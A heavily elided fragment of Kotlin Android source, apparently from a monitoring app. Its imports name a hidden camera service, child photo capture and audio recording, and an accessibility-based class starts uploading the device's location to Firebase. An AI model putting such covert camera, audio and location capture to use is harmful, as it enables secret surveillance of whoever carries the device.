...
import com.example.rule.dash.utils.ConstFun.getRandomNumeric
import com.example.rule.dash.utils.ConstFun.showApp
import com.example.rule.dash.utils.Consts.ADDRESS_AUDIO_RECORD
import com.example.rule.dash.utils.Consts.CHILD_CAPTURE_PHOTO
...
import com.example.rule.dash.utils.Consts.KEY_TEXT
...
import com.example.rule.dash.utils.FileHelper.getFileNameAudio
...
import com.example.rule.dash.utils.hiddenCameraServiceUtils.CameraCallbacks
import com.example.rule.dash.utils.hiddenCameraServiceUtils.CameraConfig
import com.example.rule.dash.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE
import com.example.rule.dash.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION
import com.example.rule.dash.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_IMAGE_WRITE_FAILED
import com.example.rule.dash.utils.hiddenCameraServiceUtils.HiddenCameraService
...
class InteractorAccessibilityData @Inject constructor(private val context: Context, private val firebase: InterfaceFirebase) : InterfaceAccessibility, CameraCallbacks {
    ...
    override fun setDataLocation(location: Location) {
        if (firebase.getUser() != null) {
            ...
            val model = com.example.rule.dash.data.model.Location(location.latitude, location.longitude, address, getDateTime())
